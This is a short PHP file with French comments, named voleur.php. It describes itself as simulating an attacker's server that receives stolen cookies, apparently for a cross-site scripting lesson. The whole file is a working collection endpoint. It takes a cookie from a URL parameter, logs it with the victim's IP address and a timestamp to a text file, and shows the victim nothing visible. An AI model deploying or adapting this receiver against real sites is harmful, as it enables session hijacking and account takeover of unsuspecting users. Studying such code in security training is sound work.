<?php
// Fichier : voleur.php
// Ce fichier simule le serveur de l'attaquant qui reçoit les cookies volés

// Récupérer le cookie envoyé dans l'URL
if (isset($_GET['cookie'])) {
    $cookie_vole = $_GET['cookie'];
    $date = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Préparer le message à enregistrer
    $message = "═══════════════════════════════════════\n";
    $message .= "🚨 COOKIE VOLÉ !\n";
    $message .= "═══════════════════════════════════════\n";
    $message .= "📅 Date : $date\n";
    $message .= "🌐 IP de la victime : $ip\n";
    $message .= "🍪 Cookie : $cookie_vole\n";
    $message .= "═══════════════════════════════════════\n\n";
    
    // Enregistrer dans un fichier texte
    $fichier = fopen("cookies_voles.txt", "a"); // "a" = ajouter à la fin
    fwrite($fichier, $message);
    fclose($fichier);
    
    // Message de confirmation (invisible pour la victime en vrai)
    echo "<!-- Cookie enregistré -->";
} else {
    echo "<!-- Aucune donnée reçue -->";
}
?>